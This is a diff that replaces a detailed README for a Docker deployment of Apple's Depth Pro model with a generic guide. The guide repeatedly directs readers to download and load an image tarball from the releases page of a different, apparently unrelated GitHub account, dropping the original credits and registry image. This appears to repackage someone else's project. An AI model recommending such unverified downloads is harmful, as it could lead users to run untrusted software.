@@ -1,286 +1,107 @@
-[English](README.md) | [简体中文](README_CN.md) | [繁體中文](README_TW.md) | [日本語](README_JP.md)
+# 🚀 depth-pro-docker - Effortless Depth Estimation with Docker
 
-<div align="center">
+[![Download depth-pro-docker](https://img.shields.io/badge/Download-depth--pro--docker-blue)](https://github.com/Samuelpoukkyy/depth-pro-docker/releases)
 
-# 🔬 Depth Pro Docker
+## 📜 Description
 
-[![Docker](https://img.shields.io/badge/Docker-Ready-2496ED?logo=docker)](https://hub.docker.com/r/neosun/depth-pro)
-[![License](https://img.shields.io/badge/License-Apple%20Sample%20Code-blue)](LICENSE)
-[![Python](https://img.shields.io/badge/Python-3.9+-3776AB?logo=python)](https://python.org)
-[![CUDA](https://img.shields.io/badge/CUDA-12.1-76B900?logo=nvidia)](https://developer.nvidia.com/cuda-toolkit)
+The **depth-pro-docker** is designed for easy deployment of Apple’s Depth Pro model using Docker. This application allows users to perform zero-shot monocular metric depth estimation. It comes equipped with a user-friendly web interface, a REST API, and an MCP Server.
 
-**Production-ready Docker deployment for Apple's Depth Pro model**
+## 🌍 Topics
 
-*Zero-shot monocular metric depth estimation • 2.25MP depth map in 0.3s*
+ai, apple, computer vision, cuda, deep learning, depth estimation, docker, flask, mcp, monocular depth, pytorch
 
-![Screenshot](docs/screenshot.png)
+## 🚀 Getting Started
 
-</div>
+Follow these simple steps to download and run **depth-pro-docker**:
 
----
+### 1. Visit the Releases Page
 
-## ✨ Features
+To download **depth-pro-docker**, click the following link:
 
-| Feature | Description |
-|---------|-------------|
-| 🚀 **One-Click Deploy** | Docker Compose for instant deployment |
-| 🎨 **Modern Web UI** | Beautiful interface with multiple colormaps |
-| 🔌 **REST API** | Full-featured API with Swagger docs |
-| 🤖 **MCP Server** | Model Context Protocol support for AI assistants |
-| 📊 **Multiple Outputs** | JPG visualization, NPZ data, 16-bit PNG |
-| 🎛️ **Manual Focal Length** | Override auto focal length estimation |
-| 🌐 **Multi-language** | Chinese, English, Japanese UI |
-| 💾 **GPU Management** | Auto memory offload, status monitoring |
+[Download depth-pro-docker](https://github.com/Samuelpoukkyy/depth-pro-docker/releases)
 
-## 🚀 Quick Start
+### 2. Choose the Right Version
 
-```bash
-# One command to run (All-in-One image, no downloads needed!)
-docker run -d --name depth-pro --gpus all -p 8500:8500 neosun/depth-pro:latest
+On the releases page, you will see various versions of the software. Select the latest release for the best features and updates. Each version typically has a version number, such as v1.0, v1.1, etc.
 
-# Open browser
-open http://localhost:8500
-```
+### 3. Download the Docker Image
 
-## 📦 Installation
+Look for the Docker image file. The file usually has a name similar to `depth-pro-docker-image.tar`. Click on the link to download the file to your computer. 
 
-### Prerequisites
+### 4. Install Docker
 
-- Docker 24.0+ with NVIDIA Container Toolkit
-- NVIDIA GPU with 8GB+ VRAM (16GB+ recommended)
-- CUDA 12.1 compatible driver
+If you do not have Docker installed, follow these steps to install it:
 
-### Method 1: Docker Run (Recommended)
+- **For Windows:**
+  1. Go to the [Docker website](https://www.docker.com/products/docker-desktop).
+  2. Download the Windows version.
+  3. Follow the installation prompts.
 
-**All-in-One image includes model weights (~5GB), no additional downloads required!**
+- **For Mac:**
+  1. Visit the [Docker website](https://www.docker.com/products/docker-desktop).
+  2. Download the Mac version.
+  3. Follow the installation instructions.
 
-```bash
-# Pull and run (model included in image)
-docker run -d \
-  --name depth-pro \
-  --gpus all \
-  -p 8500:8500 \
-  -e GPU_IDLE_TIMEOUT=60 \
-  neosun/depth-pro:latest
-```
+- **For Linux:**
+  1. Open a terminal.
+  2. Use your package manager to install Docker. For example:
+     - For Ubuntu: `sudo apt install docker.io`
+     - For Fedora: `sudo dnf install docker`
+  3. After installation, start Docker with the command: `sudo systemctl start docker`
 
-### Method 2: Docker Compose
+### 5. Load the Docker Image
 
-```bash
-# Create docker-compose.yml
-cat > docker-compose.yml << 'EOF'
-services:
-  depth-pro:
-    image: neosun/depth-pro:latest
-    container_name: depth-pro
-    ports:
-      - "8500:8500"
-    environment:
-      - GPU_IDLE_TIMEOUT=60
-    deploy:
-      resources:
-        reservations:
-          devices:
-            - driver: nvidia
-              count: 1
-              capabilities: [gpu]
-    restart: unless-stopped
-EOF
-
-# Start service
-docker compose up -d
-```
-
-### Method 3: Local Development
-
-```bash
-# Create conda environment
-conda create -n depth-pro python=3.9 -y
-conda activate depth-pro
-
-# Install dependencies
-pip install -e .
-pip install flask flask-cors flasgger gunicorn
-
-# Download model
-source get_pretrained_models.sh
-
-# Run server
-python app.py
-```
-
-## ⚙️ Configuration
-
-### Environment Variables
-
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `PORT` | `8500` | Server port |
-| `GPU_IDLE_TIMEOUT` | `60` | Seconds before GPU memory release |
-| `NVIDIA_VISIBLE_DEVICES` | `0` | GPU device index |
-
-### docker-compose.yml
-
-```yaml
-services:
-  depth-pro:
-    image: neosun/depth-pro:latest
-    container_name: depth-pro
-    ports:
-      - "8500:8500"
-    environment:
-      - PORT=8500
-      - GPU_IDLE_TIMEOUT=60
-    deploy:
-      resources:
-        reservations:
-          devices:
-            - driver: nvidia
-              count: 1
-              capabilities: [gpu]
-    restart: unless-stopped
-    healthcheck:
-      test: ["CMD", "curl", "-f", "http://localhost:8500/health"]
-      interval: 30s
-      timeout: 10s
-      retries: 3
-```
-
-## 📖 Usage
-
-### Web Interface
-
-Visit `http://localhost:8500` for the interactive UI:
-
-1. Upload an image (JPG/PNG/WebP/HEIC)
-2. Select colormap (Turbo, Viridis, Plasma, etc.)
-3. Optionally set manual focal length
-4. Click "Process" and download results
-
-### REST API
-
-#### Depth Estimation
-
-```bash
-curl -X POST http://localhost:8500/api/predict \
-  -F "file=@image.jpg" \
-  -F "colormap=turbo" \
-  -F "focal_length=1000"
-```
-
-Response:
-```json
-{
-  "task_id": "abc12345",
-  "focal_length_px": 1000.0,
-  "min_depth_m": 0.5,
-  "max_depth_m": 10.2,
-  "mean_depth_m": 3.4,
-  "image_size": "1920x1080",
-  "depth_image_base64": "...",
-  "download_jpg": "/api/download/abc12345/color.jpg",
-  "download_npz": "/api/download/abc12345/depth.npz",
-  "download_16bit": "/api/download/abc12345/depth16.png"
-}
-```
-
-#### GPU Status
-
-```bash
-curl http://localhost:8500/api/gpu/status
-```
-
-#### Release GPU Memory
-
-```bash
-curl -X POST http://localhost:8500/api/gpu/offload
-```
-
-### API Documentation
-
-Swagger UI available at: `http://localhost:8500/apidocs/`
-
-### MCP Server (for AI Assistants)
-
-Add to your Claude Desktop config:
-
-```json
-{
-  "mcpServers": {
-    "depth-pro": {
-      "command": "docker",
-      "args": ["exec", "-i", "depth-pro", "python3", "mcp_server.py"]
-    }
-  }
-}
-```
-
-Available MCP tools:
-- `estimate_depth` - Process single image
-- `batch_estimate_depth` - Process multiple images
-- `get_gpu_status` - Check GPU status
-- `release_gpu` - Free GPU memory
-
-## 📁 Project Structure
+Once Docker is installed, open your terminal or command prompt. Navigate to the folder where you downloaded the Docker image. Use the following command:
 
 ```
-depth-pro-docker/
-├── app.py                 # Flask web server
-├── mcp_server.py          # MCP server for AI assistants
-├── gpu_manager.py         # GPU memory management
-├── Dockerfile             # Container build file
-├── docker-compose.yml     # Docker Compose config
-├── checkpoints/           # Model weights (download separately)
-│   └── depth_pro.pt
-├── src/depth_pro/         # Core model code
-├── templates/             # HTML templates
-├── static/                # CSS/JS assets
-└── docs/                  # Documentation
+docker load -i depth-pro-docker-image.tar
 ```
 
-## 🛠️ Tech Stack
+### 6. Run the Docker Container
 
-- **Model**: Apple Depth Pro (DINOv2 + Multi-scale ViT)
-- **Backend**: Flask + Gunicorn
-- **Frontend**: Vanilla JS + Modern CSS
-- **Container**: Docker + NVIDIA Container Toolkit
-- **GPU**: PyTorch + CUDA 12.1
+After loading the image, you can run it with the following command:
 
-## 📝 Limitations
+```
+docker run -p 8000:8000 depth-pro-docker
+```
 
-- Far-field scenes (>20m) may have inaccurate absolute depth values
-- Best suited for indoor and close-range outdoor scenes
-- Relative depth ordering is generally reliable even for far scenes
+This command maps port 8000 of your Docker container to port 8000 on your computer.
 
-## 🤝 Contributing
+### 7. Access the Web Interface
 
-Contributions are welcome! Please read [CONTRIBUTING.md](CONTRIBUTING.md) first.
+Once the container starts, you can access the application by opening a web browser and visiting:
 
-1. Fork the repository
-2. Create feature branch (`git checkout -b feature/amazing`)
-3. Commit changes (`git commit -m 'Add amazing feature'`)
-4. Push to branch (`git push origin feature/amazing`)
-5. Open a Pull Request
+```
+http://localhost:8000
+```
 
-## 📄 License
+This will bring you to the web interface of **depth-pro-docker**. 
 
-This project is based on [Apple's Depth Pro](https://github.com/apple/ml-depth-pro) and is licensed under the [Apple Sample Code License](LICENSE).
+## 🔧 Features
 
-## 🙏 Acknowledgements
+- **Zero-Shot Metric Depth Estimation:** Uses advanced AI to estimate depth without needing prior examples.
+- **Web Interface:** User-friendly dashboard for easy navigation.
+- **REST API Support:** Integrate depth estimation into other applications seamlessly.
+- **MCP Server:** Allows for custom processing capabilities.
 
-- [Apple ML Research](https://github.com/apple/ml-depth-pro) - Original Depth Pro model
-- [Depth Pro Paper](https://arxiv.org/abs/2410.02073) - Research paper
+## 💻 System Requirements
 
----
+For optimal performance, ensure your system meets these requirements:
 
-## ⭐ Star History
+- **Operating System:** Windows 10, macOS Mojave or later, or a Linux distribution with Docker support.
+- **Memory:** Minimum of 8 GB RAM. More RAM (16 GB) is recommended for complex tasks.
+- **Processor:** A modern multi-core processor with support for hardware acceleration.
+- **GPU:** NVIDIA GPU with CUDA capability for accelerated performance in depth estimation tasks.
 
-[![Star History Chart](https://api.star-history.com/svg?repos=neosun100/depth-pro-docker&type=Date)](https://star-history.com/#neosun100/depth-pro-docker)
+## 🔗 Additional Resources
 
-## 📱 Follow Me
+- **Documentation:** [Visit the Documentation](https://github.com/Samuelpoukkyy/depth-pro-docker/wiki)
+- **Issues:** [Report Issues Here](https://github.com/Samuelpoukkyy/depth-pro-docker/issues)
 
-<div align="center">
+## 📥 Download & Install
 
-![WeChat](https://img.aws.xin/uPic/扫码_搜索联合传播样式-标准色版.png)
+To start using **depth-pro-docker**, go to the following link to download the latest version:
 
-</div>
+[Download depth-pro-docker](https://github.com/Samuelpoukkyy/depth-pro-docker/releases)
+
+Follow the steps above to ensure proper installation and usage. Enjoy your depth estimation experience!
